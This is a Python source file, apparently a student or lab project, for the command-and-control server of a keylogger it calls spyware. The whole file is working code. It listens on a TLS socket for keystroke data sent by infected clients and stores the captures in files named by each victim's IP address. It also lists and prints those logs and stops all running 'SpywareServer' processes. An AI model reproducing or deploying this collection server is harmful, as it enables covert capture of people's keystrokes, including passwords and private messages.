import socket
import datetime
import argparse
import time
import sys
import os
from pathlib import Path
from threading import Thread
import ssl
import signal
import psutil
import setproctitle

# Arguments 

parser = argparse.ArgumentParser()
group = parser.add_mutually_exclusive_group()
group.add_argument("-l", "--listen", type=int, help="listens on the TCP port entered by the user and waits for the spyware data.")
group.add_argument("-s", "--show", help="displays the list of files received by the program.", action="store_true")
group.add_argument("-r", "--readfile", type=str, help="displays the content of a keylog file.")
group.add_argument("-k", "--kill", help="stop all the instances of the server and stop all the clients.", action="store_true")
args = parser.parse_args()


#Variables

cwd = Path.cwd()
path_captures = cwd / "captures"

# Fonctions

def handle_data(data, addr):

    fic = list(path_captures.glob(f"{addr[0]}*.txt"))
    filename = path_captures / f"{addr[0]}-{datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}-keyboard.txt"
    
    if fic == []:
        with open(filename, 'w') as file:
            file.write(data)
    else:
        ficfilename = fic[0]
        with open(ficfilename, 'a') as file:
            file.write(f"\n{data}")
        os.rename(ficfilename,filename)

    print(f"Data received and saved in {filename}")



def display_files():
    files = os.listdir(path_captures)
    print("List of files captured :")
    for file in files:
        print(" - " + file)
    
    if files == []:
        print("No files captured yet")



def read_file(filename):
    try:
        fic = list(path_captures.glob(f"*{filename}*"))
        if fic == []:
            print("File not found")
        elif len(fic) == 1 :
            with open (fic[0], "r") as file:
                print(f"File content ({fic[0].name}) :")
                content = file.read()
                print(content)
        elif len(fic) > 5 :
            print("Too many files found ! \nPlease be more specific")
        else:
            print("Several files found :")
            for i in range(len(fic)):
                print(f"{i} - {fic[i].name}")
            while True:
                print("Which one do you want to read ?")
                index = int(input("Enter the index of the file you want to read : "))
                if 0 <= index < len(fic):
                    with open(fic[index], "r") as file:
                        print(f"File content ({fic[index].name}) :")
                        content = file.read()
                        print(content)
                    break
                else:
                    print("Invalid index")
    except Exception as e:
        print(f"Error: {e}")




def get_server_instances():
    procs = []

    for proc in psutil.process_iter():
        if "SpywareServer" == proc.name():
            procs.append(proc.pid)

    return procs



def stop_server(signal=None, frame=None):


    data = ssl_socket.recv(1024).decode('utf-8')

    # si des données ont été réceptionnées
    if data:
        handle_data(data, addr)

        print("send stop code")
        ssl_socket.send("STOP".encode("utf-8"))

        # temps de pause pour éviter de couper la connexion au moment de l'envoi du code STOP
        time.sleep(1)

    ssl_socket.close()
    server_socket.close()

    print(f"stoping server. host : {host}")
    
    exit()


# Traitement


if args.listen:

    setproctitle.setproctitle("SpywareServer")

    signal.signal(signal.SIGTERM, stop_server)
    
    # Configuration du socket
    host = '172.16.120.1'
    port = args.listen

    # crétaion et configuration du socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen()

    print(f"Server listening on {host}:{port}")

    running = True
    return_code = "OK"


    # récupération de la connexion
    conn, addr = server_socket.accept()

    # création du contexte ssl (avec le certificat et la clé privée)
    context_ssl = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context_ssl.load_cert_chain(certfile="./ssl2/certificate.pem", keyfile="./ssl2/private.pem")
    
    # utilisation du SSL pour lire les données entrantes
    ssl_socket = context_ssl.wrap_socket(conn, server_side=True)


    while running:
        try:
    
            # Réception des données
            print("wait for data")
            data = ssl_socket.recv(1024).decode('utf-8')

            if data == "":
                print("client dead ?")
                running = False

            # si des données ont été réceptionnées
            if data:
                handle_data(data, addr)

                # renvoyer un code
                if return_code == "OK":
                    print("[+] Keep running")
                    ssl_socket.send("OK".encode("utf-8"))


        # interception du KeyboardInterrupt
        except KeyboardInterrupt as e:
            answered = False
            
            while not answered:
                respons = input("[?] Voulez-vous vraiment arrêter le serveur ? (y/n) ")

                if respons == 'y' or respons == 'n':
                    answered = True

            if respons == 'n' or respons == 'N':
                # ne rien faire
                print("[+] Le serveur ne sera pas arrêté")


            else:
                # arrêter le serveur
                print("[+] Le serveur va s'arrêter")

                stop_server()


        except Exception as e:
            running = False
            print(f"Error Main : {e}")

        

    ssl_socket.close()
    server_socket.close()



elif args.show:
    display_files()
    sys.exit()



elif args.readfile:
    read_file(args.readfile)
    sys.exit()



elif args.kill:
    print("kill all the instances")

    procs = get_server_instances()

    print(f"{len(procs)} instances found")

    for proc in procs:
        try:
            os.kill(proc, signal.SIGTERM)

        except Exception as e:
            print(f"Error while killing servers : {e}")



